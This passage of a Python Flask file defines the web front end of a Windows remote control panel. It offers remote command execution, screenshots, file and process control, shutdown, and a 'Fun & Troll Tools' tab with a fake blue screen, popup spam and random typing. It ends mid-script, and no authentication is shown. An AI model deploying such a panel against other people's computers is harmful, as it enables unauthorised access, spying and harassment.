import os
import sys
import json
import psutil
import subprocess
import webbrowser
import threading
import time
import base64
from ctypes import windll
from ctypes import c_int
from ctypes import c_uint
from ctypes import c_ulong
from ctypes import POINTER
from ctypes import byref
import io
import random
import string
import platform
import socket
import getpass
from datetime import datetime, timedelta
from flask import Flask, render_template_string, request, jsonify, send_file
from werkzeug.serving import make_server

try:
    from PIL import ImageGrab, Image
    SCREENSHOT_AVAILABLE = True
except ImportError:
    SCREENSHOT_AVAILABLE = False
    print("⚠️  PIL not available - screenshot functionality disabled")
    print("Install with: pip install Pillow")

app = Flask(__name__)

# Store command history and active sessions
command_history = []
active_sessions = {}
scheduled_tasks = []

# HTML Template for the web interface
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced Windows Control Panel</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            color: #333;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .header {
            text-align: center;
            color: white;
            margin-bottom: 30px;
        }
        
        .nav-tabs {
            display: flex;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            margin-bottom: 20px;
            overflow: hidden;
            flex-wrap: wrap;
        }
        
        .nav-tab {
            flex: 1;
            min-width: 120px;
            padding: 15px;
            background: transparent;
            border: none;
            color: white;
            cursor: pointer;
            transition: background 0.3s;
            font-size: 14px;
        }
        
        .nav-tab.active {
            background: rgba(255, 255, 255, 0.2);
        }
        
        .nav-tab:hover {
            background: rgba(255, 255, 255, 0.1);
        }
        
        .tab-content {
            display: none;
        }
        
        .tab-content.active {
            display: block;
        }
        
        .card {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
            backdrop-filter: blur(10px);
        }
        
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
        }
        
        .btn {
            background: linear-gradient(45deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            margin: 5px;
            transition: transform 0.2s;
            font-size: 14px;
        }
        
        .btn:hover {
            transform: translateY(-2px);
        }
        
        .btn-danger {
            background: linear-gradient(45deg, #ff6b6b, #ee5a52);
        }
        
        .btn-success {
            background: linear-gradient(45deg, #51cf66, #40c057);
        }
        
        .btn-warning {
            background: linear-gradient(45deg, #ffd43b, #fab005);
        }
        
        .btn-small {
            padding: 5px 10px;
            font-size: 12px;
        }
        
        .input-group {
            margin: 10px 0;
        }
        
        .input-group input, .input-group select, .input-group textarea {
            width: 100%;
            padding: 8px;
            border: 1px solid #ddd;
            border-radius: 4px;
            margin-top: 5px;
        }
        
        .terminal {
            background: #1e1e1e;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            padding: 15px;
            border-radius: 8px;
            height: 400px;
            overflow-y: auto;
            margin-bottom: 10px;
            white-space: pre-wrap;
        }
        
        .terminal-input {
            background: #1e1e1e;
            color: #00ff00;
            border: none;
            outline: none;
            font-family: 'Courier New', monospace;
            width: 100%;
            padding: 8px;
        }
        
        .process-table {
            width: 100%;
            border-collapse: collapse;
            font-size: 12px;
        }
        
        .process-table th, .process-table td {
            padding: 8px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }
        
        .process-table th {
            background-color: #f5f5f5;
            font-weight: bold;
        }
        
        .process-table tr:hover {
            background-color: #f9f9f9;
        }
        
        .screenshot-container {
            text-align: center;
            margin: 20px 0;
        }
        
        .screenshot-img {
            max-width: 100%;
            height: auto;
            border: 2px solid #ddd;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
        }
        
        .system-info {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
        }
        
        .stat-card {
            background: rgba(255, 255, 255, 0.8);
            padding: 15px;
            border-radius: 8px;
            text-align: center;
        }
        
        .progress-bar {
            width: 100%;
            height: 20px;
            background-color: #f0f0f0;
            border-radius: 10px;
            overflow: hidden;
            margin-top: 10px;
        }
        
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #667eea, #764ba2);
            transition: width 0.3s ease;
        }
        
        .troll-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 10px;
        }
        
        #status {
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 10px 20px;
            border-radius: 5px;
            color: white;
            display: none;
            z-index: 1000;
        }
        
        .success { background-color: #4CAF50; }
        .error { background-color: #f44336; }
        .warning { background-color: #ff9800; }
        
        .file-tree {
            max-height: 300px;
            overflow-y: auto;
            border: 1px solid #ddd;
            border-radius: 4px;
            padding: 10px;
        }
        
        .file-item {
            padding: 5px;
            cursor: pointer;
            border-radius: 3px;
        }
        
        .file-item:hover {
            background-color: #f0f0f0;
        }
        
        .folder-icon::before { content: "📁 "; }
        .file-icon::before { content: "📄 "; }
        
        .network-table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 10px;
        }
        
        .network-table th, .network-table td {
            padding: 8px;
            text-align: left;
            border-bottom: 1px solid #ddd;
            font-size: 12px;
        }
        
        .audio-controls {
            display: flex;
            gap: 10px;
            align-items: center;
            flex-wrap: wrap;
        }
        
        .volume-slider {
            flex: 1;
            min-width: 200px;
        }
    </style>
</head>
<body>
    <div id="status"></div>
    
    <div class="container">
        <div class="header">
            <h1>🖥️ Advanced Windows Control Panel</h1>
            <p>Professional remote system management interface</p>
        </div>
        
        <div class="nav-tabs">
            <button class="nav-tab active" onclick="switchTab('dashboard')">📊 Dashboard</button>
            <button class="nav-tab" onclick="switchTab('terminal')">💻 Terminal</button>
            <button class="nav-tab" onclick="switchTab('processes')">📋 Processes</button>
            <button class="nav-tab" onclick="switchTab('files')">📁 Files</button>
            <button class="nav-tab" onclick="switchTab('network')">🌐 Network</button>
            <button class="nav-tab" onclick="switchTab('media')">🎵 Media</button>
            <button class="nav-tab" onclick="switchTab('system')">⚙️ System</button>
            <button class="nav-tab" onclick="switchTab('fun')">🎮 Fun Tools</button>
        </div>
        
        <!-- Dashboard Tab -->
        <div id="dashboard" class="tab-content active">
            <div class="grid">
                <div class="card">
                    <h2>📊 System Monitoring</h2>
                    <div class="system-info">
                        <div class="stat-card">
                            <h3>CPU Usage</h3>
                            <div id="cpuUsage">Loading...</div>
                            <div class="progress-bar">
                                <div id="cpuProgress" class="progress-fill" style="width: 0%"></div>
                            </div>
                        </div>
                        <div class="stat-card">
                            <h3>Memory Usage</h3>
                            <div id="memoryUsage">Loading...</div>
                            <div class="progress-bar">
                                <div id="memoryProgress" class="progress-fill" style="width: 0%"></div>
                            </div>
                        </div>
                        <div class="stat-card">
                            <h3>Disk Usage</h3>
                            <div id="diskUsage">Loading...</div>
                            <div class="progress-bar">
                                <div id="diskProgress" class="progress-fill" style="width: 0%"></div>
                            </div>
                        </div>
                    </div>
                    <button class="btn" onclick="refreshSystemInfo()">🔄 Refresh</button>
                </div>
                
                <div class="card">
                    <h2>📸 Screenshot</h2>
                    <div class="screenshot-container">
                        <img id="screenshotImg" class="screenshot-img" style="display: none;" alt="Screenshot">
                        <div id="screenshotPlaceholder">Click "Take Screenshot" to capture screen</div>
                    </div>
                    <button class="btn" onclick="takeScreenshot()">📸 Take Screenshot</button>
                    <button class="btn" onclick="downloadScreenshot()">💾 Download</button>
                </div>
                
                <div class="card">
                    <h2>⚡ Quick Controls</h2>
                    <button class="btn btn-danger" onclick="shutdownSystem()">🔴 Shutdown</button>
                    <button class="btn btn-danger" onclick="restartSystem()">🔄 Restart</button>
                    <button class="btn" onclick="lockSystem()">🔒 Lock Screen</button>
                    <button class="btn" onclick="openTaskManager()">📋 Task Manager</button>
                    <button class="btn" onclick="openControlPanel()">⚙️ Control Panel</button>
                    <button class="btn" onclick="openDeviceManager()">🔧 Device Manager</button>
                </div>
                
                <div class="card">
                    <h2>📈 System Information</h2>
                    <div id="detailedSystemInfo">
                        <button class="btn" onclick="getDetailedSystemInfo()">📊 Get System Details</button>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Terminal Tab -->
        <div id="terminal" class="tab-content">
            <div class="card">
                <h2>💻 Windows Command Terminal</h2>
                <div id="terminalOutput" class="terminal">Windows Command Terminal - Web Interface
C:\\Users\\> </div>
                <div style="display: flex;">
                    <span style="color: #00ff00; font-family: monospace; padding: 8px;">C:\\></span>
                    <input type="text" id="terminalInput" class="terminal-input" placeholder="Enter command..." onkeypress="handleTerminalInput(event)">
                </div>
                <div style="margin-top: 10px;">
                    <button class="btn" onclick="clearTerminal()">🗑️ Clear</button>
                    <button class="btn" onclick="openPowerShell()">💙 PowerShell</button>
                    <button class="btn" onclick="getCommandHistory()">📜 History</button>
                </div>
            </div>
        </div>
        
        <!-- Processes Tab -->
        <div id="processes" class="tab-content">
            <div class="card">
                <h2>📋 Process Manager</h2>
                <div style="margin-bottom: 15px;">
                    <button class="btn" onclick="refreshProcesses()">🔄 Refresh</button>
                    <button class="btn btn-success" onclick="toggleAutoRefresh()">⏱️ Auto-Refresh (OFF)</button>
                    <input type="text" id="processFilter" placeholder="Filter processes..." style="margin-left: 10px; padding: 8px;">
                </div>
                <div style="overflow-x: auto;">
                    <table class="process-table" id="processTable">
                        <thead>
                            <tr>
                                <th>Name</th>
                                <th>PID</th>
                                <th>CPU %</th>
                                <th>Memory %</th>
                                <th>Memory (MB)</th>
                                <th>Status</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody id="processTableBody">
                            <tr><td colspan="7" style="text-align: center;">Click refresh to load processes</td></tr>
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
        
        <!-- Files Tab -->
        <div id="files" class="tab-content">
            <div class="grid">
                <div class="card">
                    <h2>📁 File Browser</h2>
                    <div class="input-group">
                        <label>Current Directory:</label>
                        <input type="text" id="currentPath" value="C:\\" readonly>
                    </div>
                    <div class="input-group">
                        <label>Navigate to:</label>
                        <input type="text" id="directoryPath" placeholder="C:\\Users\\YourName\\Desktop" value="C:\\">
                        <button class="btn" onclick="browseDirectory()">📂 Browse</button>
                    </div>
                    <div id="fileTree" class="file-tree">
                        <div style="padding: 20px; text-align: center;">Enter a path and click Browse</div>
                    </div>
                </div>
                
                <div class="card">
                    <h2>🔧 File Operations</h2>
                    <div class="input-group">
                        <label>Create Folder:</label>
                        <input type="text" id="newFolderName" placeholder="New Folder Name">
                        <button class="btn" onclick="createFolder()">📁 Create</button>
                    </div>
                    <div class="input-group">
                        <label>Create File:</label>
                        <input type="text" id="newFileName" placeholder="filename.txt">
                        <button class="btn" onclick="createFile()">📄 Create</button>
                    </div>
                    <div class="input-group">
                        <label>Run Program/Command:</label>
                        <input type="text" id="commandInput" placeholder="notepad.exe or full path">
                        <button class="btn" onclick="runCommand()">▶️ Execute</button>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Network Tab -->
        <div id="network" class="tab-content">
            <div class="card">
                <h2>🌐 Network Information</h2>
                <button class="btn" onclick="refreshNetworkInfo()">🔄 Refresh Network Info</button>
                <button class="btn" onclick="getNetworkConnections()">🔗 Active Connections</button>
                <button class="btn" onclick="pingTest()">📡 Ping Test</button>
                <div id="networkInfo">
                    <p>Click refresh to load network information</p>
                </div>
            </div>
        </div>
        
        <!-- Media Tab -->
        <div id="media" class="tab-content">
            <div class="grid">
                <div class="card">
                    <h2>🎵 Audio Control</h2>
                    <div class="audio-controls">
                        <button class="btn" onclick="muteSystem()">🔇 Mute</button>
                        <button class="btn" onclick="unmuteSystem()">🔊 Unmute</button>
                        <button class="btn" onclick="volumeUp()">🔊+ Volume Up</button>
                        <button class="btn" onclick="volumeDown()">🔉- Volume Down</button>
                    </div>
                    <div class="input-group">
                        <label>Set Volume (0-100):</label>
                        <input type="range" id="volumeSlider" min="0" max="100" value="50" class="volume-slider">
                        <button class="btn" onclick="setVolume()">🎚️ Set</button>
                    </div>
                </div>
                
                <div class="card">
                    <h2>💬 Text-to-Speech</h2>
                    <div class="input-group">
                        <label>Text to speak:</label>
                        <textarea id="ttsText" placeholder="Enter text to speak..." rows="3"></textarea>
                        <button class="btn" onclick="speakText()">🗣️ Speak</button>
                        <button class="btn btn-danger" onclick="stopSpeaking()">⏹️ Stop</button>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- System Tab -->
        <div id="system" class="tab-content">
            <div class="grid">
                <div class="card">
                    <h2>🖥️ Display Control</h2>
                    <button class="btn" onclick="turnOffMonitor()">📺 Turn Off Monitor</button>
                    <button class="btn" onclick="changeWallpaper()">🖼️ Random Wallpaper</button>
                    <div class="input-group">
                        <label>Custom Wallpaper URL:</label>
                        <input type="text" id="wallpaperUrl" placeholder="https://example.com/image.jpg">
                        <button class="btn" onclick="setCustomWallpaper()">🖼️ Set Wallpaper</button>
                    </div>
                </div>
                
                <div class="card">
                    <h2>⚙️ System Services</h2>
                    <button class="btn" onclick="getServices()">📋 List Services</button>
                    <button class="btn" onclick="getStartupPrograms()">🚀 Startup Programs</button>
                    <button class="btn" onclick="cleanTempFiles()">🧹 Clean Temp Files</button>
                    <div id="servicesInfo"></div>
                </div>
            </div>
        </div>
        
        <!-- Fun Tools Tab -->
        <div id="fun" class="tab-content">
            <div class="card">
                <h2>🎮 Fun & Troll Tools</h2>
                <div class="troll-grid">
                    <button class="btn btn-warning" onclick="openMultipleNotepad()">📝 Spam Notepad</button>
                    <button class="btn btn-warning" onclick="flipScreen()">🔄 Flip Screen</button>
                    <button class="btn btn-warning" onclick="mouseJiggle()">🖱️ Mouse Jiggle</button>
                    <button class="btn btn-warning" onclick="fakeBlueScreen()">💙 Fake BSOD</button>
                    <button class="btn btn-warning" onclick="matrixRain()">💚 Matrix Rain</button>
                    <button class="btn btn-warning" onclick="openRandomWebsites()">🌐 Random Sites</button>
                    <button class="btn btn-warning" onclick="typeRandomText()">⌨️ Random Typing</button>
                    <button class="btn btn-warning" onclick="popupSpam()">🗂️ Popup Spam</button>
                    <button class="btn btn-warning" onclick="cdTrayTroll()">💿 CD Tray Dance</button>
                    <button class="btn btn-warning" onclick="desktopDance()">💃 Desktop Dance</button>
                </div>
                
                <div class="input-group" style="margin-top: 20px;">
                    <label>Custom Message Box:</label>
                    <input type="text" id="customMessage" placeholder="Enter your message...">
                    <button class="btn" onclick="showCustomMessage()">💬 Show Message</button>
                </div>
                
                <div class="input-group">
                    <label>Schedule Task (minutes from now):</label>
                    <div style="display: flex; gap: 10px;">
                        <input type="number" id="scheduleMinutes" placeholder="5" style="width: 100px;">
                        <input type="text" id="scheduleCommand" placeholder="notepad.exe" style="flex: 1;">
                        <button class="btn" onclick="scheduleTask()">⏰ Schedule</button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        let autoRefreshInterval = null;
        let currentScreenshot = null;
        
        function switchTab(tabName) {
            // Hide all tabs
            const tabs = document.querySelectorAll('.tab-content');
            tabs.forEach(tab => tab.classList.remove('active'));
            
            // Remove active class from nav tabs
            const navTabs = document.querySelectorAll('.nav-tab');
            navTabs.forEach(tab => tab.classList.remove('active'));
            
            // Show selected tab
            document.getElementById(tabName).classList.add('active');
            event.target.classList.add('active');
        }

        function showStatus(message, type = 'success') {
            const status = document.getElementById('status');
            status.textContent = message;
            status.className = type;
            status.style.display = 'block';
            setTimeout(() => {
                status.style.display = 'none';
            }, 3000);
        }

        function refreshSystemInfo() {
            fetch('/api/system-info')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('cpuUsage').textContent = data.cpu + '%';
                    document.getElementById('cpuProgress').style.width = data.cpu + '%';
                    
                    document.getElementById('memoryUsage').textContent = data.memory + '%';
                    document.getElementById('memoryProgress').style.width = data.memory + '%';
                    
                    document.getElementById('diskUsage').textContent = data.disk + '%';
                    document.getElementById('diskProgress').style.width = data.disk + '%';
                })
                .catch(error => showStatus('Error updating system info', 'error'));
        }

        function takeScreenshot() {
            fetch('/api/screenshot')
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        const img = document.getElementById('screenshotImg');
                        const placeholder = document.getElementById('screenshotPlaceholder');
                        img.src = 'data:image/png;base64,' + data.image;
                        img.style.display = 'block';
                        placeholder.style.display = 'none';
                        currentScreenshot = data.image;
                        showStatus('Screenshot captured!');
                    } else {
                        showStatus(data.message, 'error');
                    }
                })
                .catch(error => showStatus('Error taking screenshot', 'error'));
        }

        function downloadScreenshot() {
            if (currentScreenshot) {
                const link = document.createElement('a');
                link.href = 'data:image/png;base64,' + currentScreenshot;
                link.download = 'screenshot_' + new Date().getTime() + '.png';
                link.click();
            } else {
                showStatus('No screenshot to download', 'warning');
            }
        }

        function handleTerminalInput(event) {
            if (event.key === 'Enter') {
                const input = document.getElementById('terminalInput');
                const command = input.value.trim();
                if (command) {
                    executeTerminalCommand(command);
                    input.value = '';
                }
            }
        }

        function executeTerminalCommand(command) {
            const output = document.getElementById('terminalOutput');
            output.textContent += 'C:\\> ' + command + '\\n';
            
            fetch('/api/terminal-command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ command: command })
            })
            .then(response => response.json())
            .then(data => {
                output.textContent += data.output + '\\n\\nC:\\> ';
                output.scrollTop = output.scrollHeight;
            })
            .catch(error => {
                output.textContent += 'Error executing command\\n\\nC:\\> ';
                output.scrollTop = output.scrollHeight;
            });
        }

        function clearTerminal() {
            document.getElementById('terminalOutput').textContent = 'Windows Command Terminal - Web Interface\\nC:\\Users\\> ';
        }

        function refreshProcesses() {
            fetch('/api/processes-detailed')
                .then(response => response.json())
                .then(data => {
                    const tbody = document.getElementById('processTableBody');
                    tbody.innerHTML = '';
                    
                    data.processes.forEach(proc => {
                        const row = document.createElement('tr');
                        row.innerHTML = `
                            <td>${proc.name}</td>
                            <td>${proc.pid}</td>
                            <td>${proc.cpu}%</td>
                            <td>${proc.memory}%</td>
                            <td>${proc.memory_mb} MB</td>
                            <td><span style="color: ${proc.status === 'running' ? 'green' : 'orange'}">${proc.status}</span></td>
                            <td>
                                <button class="btn btn-small btn-danger" onclick="killProcess(${proc.pid})">❌</button>
                                <button class="btn btn-small" onclick="getProcessInfo(${proc.pid})">ℹ️</button>
                            </td>
                        `;
                        tbody.appendChild(row);
                    });
                    
                    showStatus('Processes refreshed');
                })
                .catch(error => showStatus('Error loading processes', 'error'));
        }

        function toggleAutoRefresh() {
            const btn = event.target;
            if (autoRefreshInterval) {
                clearInterval(autoRefreshInterval);
                autoRefreshInterval = null;
                btn.textContent = '⏱️ Auto-Refresh (OFF)';
                btn.classList.remove('btn-success');
                btn.classList.add('btn');
            } else {
                autoRefreshInterval = setInterval(refreshProcesses, 2000);
                btn.textContent = '⏱️ Auto-Refresh (ON)';
                btn.classList.remove('btn');
                btn.classList.add('btn-success');
            }
        }

        function killProcess(pid) {
            if (confirm(`Kill process ${pid}?`)) {
                fetch('/api/kill-process', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ pid: pid })
                })
                .then(response => response.json())
                .then(data => {
                    showStatus(data.message, data.success ? 'success' : 'error');
                    if (data.success) refreshProcesses();
                });
            }
        }

        // System Control Functions
        function shutdownSystem() {
            if (confirm('Shutdown computer?')) {
                fetch('/api/shutdown', { method: 'POST' })
                    .then(response => response.json())
                    .then(data => showStatus(data.message, data.success ? 'success' : 'error'));
            }
        }

        function restartSystem() {
            if (confirm('Restart computer?')) {
                fetch('/api/restart', { method: 'POST' })
                    .then(response => response.json())
                    .then(data => showStatus(data.message, data.success ? 'success' : 'error'));
            }
        }

        function lockSystem() {
            fetch('/api/lock', { method: 'POST' })
                .then(response => response.json())
                .then(data => showStatus(data.message, data.success ? 'success' : 'error'));
        }

        function openTaskManager() {
            fetch('/api/open-app', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ app: 'taskmgr' })
            })
            .then(response => response.json())
            .then(data => showStatus(data.message, data.success ? 'success' : 'error'));
        }

        function openControlPanel() {
            fetch('/api/open-app', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ app: 'control' })
            })
            .then(response => response.json())
            .then(data => showStatus(data.message, data.success ? 'success' : 'error'));
        }

        function openDeviceManager() {
            fetch('/api/open-app', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ app: 'devmgmt.msc' })
            })
            .then(response => response.json())
            .then(data => showStatus(data.message, data.success ? 'success' : 'error'));
        }

        function openPowerShell() {
            fetch('/api/open-app', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ app: 'powershell' })
            })
            .then(response => response.json())
            .then(data => showStatus(data.message, data.success ? 'success' : 'error'));
        }

        function getDetailedSystemInfo() {
            fetch('/api/detailed-system-info')
                .then(response => response.json())
                .then(data => {
                    const infoDiv = document.getElementById('detailedSystemInfo');
                    infoDiv.innerHTML = `
                        <h3>System Details</h3>
                        <p><strong>Computer Name:</strong> ${data.computer_name}</p>
                        <p><strong>Username:</strong> ${data.username}</p>
                        <p><strong>OS:</strong> ${data.os}</p>
                        <p><strong>Processor:</strong> ${data.processor}</p>
                        <p><strong>Architecture:</strong> ${data.architecture}</p>
                        <p><strong>Total RAM:</strong> ${data.total_memory} GB</p>
                        <p><strong>Python Version:</strong> ${data.python_version}</p>
                        <p><strong>Uptime:</strong> ${data.uptime}</p>
                        <button class="btn" onclick="getDetailedSystemInfo()">🔄 Refresh</button>
                    `;
                })
                .catch(error => showStatus('Error getting system info', 'error'));
        }

        function getCommandHistory() {
            fetch('/api/command-history')
                .then(response => response.json())
                .then(data => {
                    const output = document.getElementById('terminalOutput');
                    output.textContent += '\\n=== Command History ===\\n';
                    data.history.forEach((cmd, index) => {
                        output.textContent += `${index + 1}. ${cmd}\\n`;
                    });
                    output.textContent += '=====================\\n\\nC:\\> ';
                    output.scrollTop = output.scrollHeight;
                })
                .catch(error => showStatus('Error getting history', 'error'));
        }

        function browseDirectory() {
            const path = document.getElementById('directoryPath').value;
            fetch('/api/browse-directory', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ path: path })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    document.getElementById('currentPath').value = data.current_path;
                    const tree = document.getElementById('fileTree');
                    tree.innerHTML = '';
                    
                    data.items.forEach(item => {
                        const div = document.createElement('div');
                        div.className = 'file-item';
                        div.innerHTML = `<span class="${item.type}-icon"></span>${item.name}`;
                        if (item.type === 'folder') {
                            div.onclick = () => {
                                document.getElementById('directoryPath').value = item.path;
                                browseDirectory();
                            };
                        }
                        tree.appendChild(div);
                    });
                    showStatus('Directory loaded');
                } else {
                    showStatus(data.message, 'error');
                }
            })
            .catch(error => showStatus('Error browsing directory', 'error'));
        }

        function createFolder() {
            const name = document.getElementById('newFolderName').value;
            const currentPath = document.getElementById('currentPath').value;
            
            if (!name) {
                showStatus('Please enter folder name', 'warning');
                return;
            }
            
            fetch('/api/create-folder', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ path: currentPath, name: name })
            })
            .then(response => response.json())
            .then(data => {
                showStatus(data.message, data.success ? 'success' : 'error');
                if (data.success) {
                    document.getElementById('newFolderName').value = '';
                    browseDirectory();
                }
            });
        }

        function createFile() {
            const name = document.getElementById('newFileName').value;
            const currentPath = document.getElementById('currentPath').value;
            
            if (!name) {
                showStatus('Please enter file name', 'warning');
                return;
            }
            
            fetch('/api/create-file', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ path: currentPath, name: name })
            })
            .then(response => response.json())
            .then(data => {
                showStatus(data.message, data.success ? 'success' : 'error');
                if (data.success) {
                    document.getElementById('newFileName').value = '';
                    browseDirectory();
                }
            });
        }

        function runCommand() {
            const command = document.getElementById('commandInput').value;
            
            if (!command) {
                showStatus('Please enter command', 'warning');
                return;
            }
            
            fetch('/api/run-command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ command: command })
            })
            .then(response => response.json())
            .then(data => {
                showStatus(data.message, data.success ? 'success' : 'error');
                document.getElementById('commandInput').value = '';
            });
        }

        function refreshNetworkInfo() {
            fetch('/api/network-info')
                .then(response => response.json())
                .then(data => {
                    const infoDiv = document.getElementById('networkInfo');
                    let html = '<h3>Network Interfaces</h3>';
                    
                    data.interfaces.forEach(iface => {
                        html += `
                            <div style="margin: 10px 0; padding: 10px; border: 1px solid #ddd; border-radius: 5px;">
                                <strong>${iface.name}</strong><br>
                                IP: ${iface.ip}<br>
                                Status: <span style="color: ${iface.status === 'up' ? 'green' : 'red'}">${iface.status}</span>
                            </div>
                        `;
                    });
                    
                    infoDiv.innerHTML = html;
                })
                .catch(error => showStatus('Error getting network info', 'error'));
        }

        function getNetworkConnections() {
            fetch('/api/network-connections')
                .then(response => response.json())
                .then(data => {
                    const infoDiv = document.getElementById('networkInfo');
                    let html = '<h3>Active Network Connections</h3>';
                    html += '<table class="network-table"><tr><th>Local Address</th><th>Remote Address</th><th>Status</th><th>PID</th></tr>';
                    
                    data.connections.forEach(conn => {
                        html += `<tr>
                            <td>${conn.local_address}</td>
                            <td>${conn.remote_address}</td>
                            <td>${conn.status}</td>
                            <td>${conn.pid}</td>
                        </tr>`;
                    });
                    
                    html += '</table>';
                    infoDiv.innerHTML = html;
                })
                .catch(error => showStatus('Error getting connections', 'error'));
        }

        function pingTest() {
            const target = prompt('Enter IP or hostname to ping:', 'google.com');
            if (target) {
                fetch('/api/ping', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ target: target })
                })
                .then(response => response.json())
                .then(data => {
                    const infoDiv = document.getElementById('networkInfo');
                    infoDiv.innerHTML = `<h3>Ping Results</h3><pre>${data.result}</pre>`;
                });
            }
        }

        // Audio Controls
        function muteSystem() {
            fetch('/api/audio-control', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'mute' })
            })
            .then(response => response.json())
            .then(data => showStatus(data.message, data.success ? 'success' : 'error'));
        }

        function unmuteSystem() {
            fetch('/api/audio-control', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'unmute' })
            })
            .then(response => response.json())
            .then(data => showStatus(data.message, data.success ? 'success' : 'error'));
        }

        function volumeUp() {
            fetch('/api/audio-control', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'volume_up' })
            })
            .then(response => response.json())
            .then(data => showStatus(data.message, data.success ? 'success' : 'error'));
        }

        function volumeDown() {
            fetch('/api/audio-control', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'volume_down' })
            })
            .then(response => response.json())
            .then(data => showStatus(data.message, data.success ? 'success' : 'error'));
        }

        function setVolume() {
            const volume = document.getElementById('volumeSlider').value;
            fetch('/api/audio-control', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'set_volume', volume: parseInt(volume) })
            })
            .then(response => response.json())
            .then(data => showStatus(data.message, data.success ? 'success' : 'error'));
        }

        function speakText() {
            const text = document.getElementById('ttsText').value;
            if (!text) {
                showStatus('Please enter text to speak', 'warning');
                return;
            }
            
            fetch('/api/tts', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ text: text })
            })
            .then(response => response.json())
            .then(data => showStatus(data.message, data.success ? 'success' : 'error'));
        }

        function stopSpeaking() {
            fetch('/api/tts-stop', { method: 'POST' })
                .then(response => response.json())
                .then(data => showStatus(data.message, data.success ? 'success' : 'error'));
        }

        function turnOffMonitor() {
            fetch('/api/monitor-control', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'off' })
            })
            .then(response => response.json())
            .then(data => showStatus(data.message, data.success ? 'success' : 'error'));
        }

        function changeWallpaper() {
            fetch('/api/wallpaper', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'random' })
            })
            .then(response => response.json())
            .then(data => showStatus(data.message, data.success ? 'success' : 'error'));
        }

        function setCustomWallpaper() {
            const url = document.getElementById('wallpaperUrl').value;
            if (!url) {
                showStatus('Please enter wallpaper URL', 'warning');
                return;
            }
            
            fetch('/api/wallpaper', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'custom', url: url })
            })
            .then(response => response.json())
            .then(data => showStatus(data.message, data.success ? 'success' : 'error'));
        }

        function getServices() {
            fetch('/api/services')
                .then(response => response.json())
                .then(data => {
                    const infoDiv = document.getElementById('servicesInfo');
                    let html = '<h3>System Services</h3>';
                    html += '<div style="max-height: 300px; overflow-y: auto;">';
                    
                    data.services.forEach(service => {
                        html += `
                            <div style="margin: 5px 0; padding: 8px; border: 1px solid #ddd; border-radius: 3px;">
                                <strong>${service.name}</strong> - 
                                <span style="color: ${service.status === 'running' ? 'green' : 'orange'}">${service.status}</span>
                            </div>
                        `;
                    });
                    
                    html += '</div>';
                    infoDiv.innerHTML = html;
                })
                .catch(error => showStatus('Error getting services', 'error'));
        }

        function getStartupPrograms() {
            fetch('/api/startup-programs')
                .then(response => response.json())
                .then(data => {
                    const infoDiv = document.getElementById('servicesInfo');
                    let html = '<h3>Startup Programs</h3>';
                    html += '<div style="max-height: 300px; overflow-y: auto;">';
                    
                    data.programs.forEach(program => {
                        html += `
